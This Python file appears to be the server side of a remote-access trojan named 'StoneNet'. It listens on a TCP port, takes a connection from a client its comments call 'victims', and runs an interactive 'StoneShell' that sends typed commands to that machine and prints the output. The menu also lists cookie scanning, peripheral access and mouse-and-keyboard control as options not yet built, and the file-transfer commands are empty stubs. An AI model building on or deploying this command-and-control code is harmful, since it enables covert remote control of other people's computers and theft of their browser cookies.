#Written by Stone Preheim
import socket

ADDR = '192.168.1.77'#portforwarding FTW! if you are looking to test this dr. use loopback
PORT = 7771

class Server:
    def __init__(self, addr, port):
        self.ADDRESS = addr
        self.PORT = port

    #dont have to worry about blocking sockets and multiple clients as discord controller will silently handle victims.
    def startServer(self):
        print("WELCOME TO STONENET")
        print(f"Starting Server on {ADDR} port {PORT}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.bind((ADDR, PORT))
            soc.listen()
            print("server is listening.... quietly...")
            conn, address = soc.accept()
            with conn:
                #starting main shell loop. only shell commands right now will come to add more advanced preset scripts and such.
                print("Connected to Client. Initiating Main Menu....")
                while True:
                    Choice = input("Select number from the Following Options:\n1) Basic System Shell\n2) Open Peripherals\n3) Scan For Cookies\n4) Control M&K\n5) Exit\n> ")
                    #basic shell loop
                    if Choice == "1":
                        while True:
                            servCom = input("StoneShell> ")
                            if servCom == "exit":
                                break
                            elif servCom == "getFile":
                                print()
                            elif servCom == "sendFile":
                                print()
                            else:
                                conn.sendall(servCom.encode())
                                output = conn.recv(1024)
                                if output == b'EXCEPTION':
                                    print("Client Experienced a fatal exception closing connection...")
                                    exit(1)
                                else:
                                    print(output.decode("utf-8"))
                    #exit other functions coming soon
                    elif Choice == "5":
                        break
                    else:
                        print("Your input was invalid or option is not yet defined")

    def testSocket(ADDR, PORT):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:  #creating socket with ipv4 and tcp. Need to reconfigure this to not use blocking.
            soc.bind((ADDR, PORT))
            soc.listen()
            print("server is listening.... quietly...")
            conn, address = soc.accept()
            with conn:
                print("Connected to:", address)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print("Client sent:" + repr(data))
                    conn.sendall(data)

if __name__ == '__main__':
    #Server.testSocket(ADDR, PORT)
    serv = Server(ADDR, PORT)
    serv.startServer()
